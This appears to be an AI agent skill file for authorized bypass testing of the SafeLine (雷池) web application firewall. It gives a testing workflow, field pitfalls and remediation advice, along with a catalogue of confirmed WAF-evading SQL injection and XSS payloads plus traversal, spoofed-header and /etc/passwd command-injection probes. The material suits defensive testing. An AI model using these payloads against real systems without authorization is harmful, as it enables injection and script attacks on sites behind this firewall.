---
name: safeline-waf-bypass
description: >-
  SafeLine WAF bypass testing. Use when testing SafeLine WAF.
---

# SafeLine (雷池) WAF Bypass & Effectiveness Testing

> Built from 2026-08-11 authorized testing of 雷池 on xycovo.com (own asset). Baseline + 2 rounds of payload matrices + protocol layer: **49 SQLi + 25 XSS parameter-layer penetrations** confirmed via backend nginx logs; path & protocol layers held firm. Full payload lists: `references/safeline-bypass-payloads.md`.

## When to use
- Testing bypasses against 雷池 SafeLine WAF (identify: `Server: tengine`, `Set-Cookie: sl-session=...`, block page `403 Forbidden` + `<!-- event_id: ... -->`)
- Validating WAF rule coverage on your own server, or an authorized target behind SafeLine
- Re-testing after rule updates / semantic engine changes / reported misses

## Workflow

### Phase 0 — baseline (always first)
1. Normal request → expect 200
2. `?id=1' AND '1'='1` (SQLi), `?q=<script>alert(1)</script>` (XSS), `?cmd=cat /etc/passwd` (CMDi) → expect 403 + `event_id` comment
3. If baseline doesn't block, the WAF is misconfigured (seen before: site port stored as string broke rule delivery, WAF proxy-only) — fix config before bypass hunting

### Phase 1 — batch payload matrices
Run `scripts/waf_batch_probe.py` (configurable target/param/matrices) with:
- SQLi: comment-splitting, whitespace-splitting, `||`, backticks, full-width Unicode, double-encoding, comment truncation, math equivalents
- XSS: double-write tags, backtick calls, template literals, comment/whitespace confusion, event-attr variants
- Path: `.git`/traversal variants (payload in URI PATH — see pitfall 1)
- Protocol: spoofed IP headers, UA variants, POST JSON/form, chunked, oversized payloads

Classify: `BLOCKED` = 403 + `event_id` in body; `PASSED` = 200 + homepage marker; watch for `OTHER` codes (400/404 = origin nginx rejecting, not WAF).

### Phase 2 — verify penetrations (MANDATORY, never skip)
- Manual re-curl of each PASSED payload with exact encoding — confirm not a script artifact
- **Ironclad proof**: grep backend nginx access.log for the request — if it reached origin with 200, the WAF truly passed it (403s never appear there)
- Re-test path variants with payload genuinely in the URI path (see pitfall 1)

## CRITICAL PITFALLS (all hit in the field)

1. **Path-bypass tests must put payload in the URI path, NOT a query param.** `?x=/.git/config` returns 200 homepage (root exists) and the classifier marks PASSED — a total false positive that inflated a run to "30 path bypasses" that were all fake. Build URLs as `TARGET + "/.git/config"` directly.
2. **`/.git/..` → 200 is NOT a bypass.** nginx normalizes the path to `/` and serves the homepage. Before trusting a path-layer PASSED, check what path normalization does to it.
3. **Soft-404 sites poison classifiers.** If nginx `try_files ... /index.html` fallback is on, ANY non-existent path returns 200+homepage, so every path test "passes". Fix soft-404 first (`try_files $uri $uri/ =404` + `error_page 404 /404.html` when a dist/404.html exists), or make the classifier body-check the homepage marker.
4. **Empty-message JS exceptions in headless browsers are NOT WAF/CSP issues.** pagefind stuck on "Searching for..." + empty exceptions = headless wasm worker limits. Do a clean A/B test (temporarily comment out the CSP header, reload nginx, retest, restore) before blaming your own headers.
5. **nginx `.bak` files inside `sites-enabled/` / `conf.d/` get loaded** → `conflicting server name ... ignored` warnings (they only survive by alphabetical luck). Backups must live outside include dirs, e.g. `/etc/nginx/backups/`.
6. **Ubuntu 24.04: SSH service is `ssh.service`, not `sshd.service`** — `systemctl restart sshd` fails "Unit not found" and the config never reloads; use `ssh`, and always `sshd -t` before restart.

## SafeLine observed blind spots (2026-08-11, latest docker image)

### SQLi parameter-layer penetrations (semantic engine misses)
- Comment-splitting keywords: `1' UN/**/ION SE/**/LECT 1,2,3-- -`, `AN/**/D`, `A/**/ND`
- Whitespace-splitting: `UN%0aION SE%0aLECT`, `AN%09D`, `AN%0bD`
- `||` (MySQL OR equivalent): `1'||'1`, `1'/**/||/**/'1`
- Backtick identifiers: `` 1` OR `1`=`1 ``, `` 1`||`1 ``
- Full-width Unicode: `1' OR １=１-- -`, `１＝１`, `①=①`, `⑴=⑴`, `%EF%BC%87` (full-width quote)
- Comment truncation: `1' AND-- -'1`, `1' AND# '1`
- Double URL encoding: `%2527%257C%257C%25271`

### XSS parameter-layer penetrations
- Double-write tags: `<scr<script>ipt>alert(1)</scr</script>ipt>`
- Backtick calls: `` alert`1` ``, `` prompt`1` ``, `` alert`document.domain` ``
- Template literals: `${alert(1)}`, `<svg/onload=${alert(1)}>`
- Comment/whitespace confusion: `<svg/onload=alert//(1)>`, `alert%0a(1)`, `alert%09(1)`, `alert\(1)`, `<img src=x onerror=alert (1)>`

### Held firm (no bypass found)
- Path layer: 33/34 `.git`/traversal variants blocked (case, encoding, %00, `;`, backslash, full-width dots) — only `/.git/..` returned 200 (normalization artifact, not a leak)
- Protocol: 12 spoofed IP headers (X-Forwarded-For: 127.0.0.1, X-Real-IP, True-Client-IP, CF-Connecting-IP, Forwarded, etc.) all blocked; UA variants (curl/sqlmap/Googlebot/Baiduspider/iPhone) all blocked; POST JSON & form bodies parsed & blocked; chunked transfer reassembled & blocked; >16KB requests dropped/refused

## Reporting & defense
- On static no-sink sites penetrations have zero current impact; risk materializes when dynamic features are added — parameterized queries + output encoding are the real defense (WAF has semantic blind spots by design)
- Submit confirmed misses to SafeLine community (漏报反馈渠道) — vendor updates rules; keep the payload matrix updated after each round
- Typical SafeLine config checks: semantic engine on/off, rule library version, site port stored as string vs int (breaks rule delivery silently)

## Files
- `scripts/waf_batch_probe.py` — reusable batch probe (baseline + matrices + classify + save results)
- `references/safeline-bypass-payloads.md` — full penetrated payload lists + protocol-layer results table
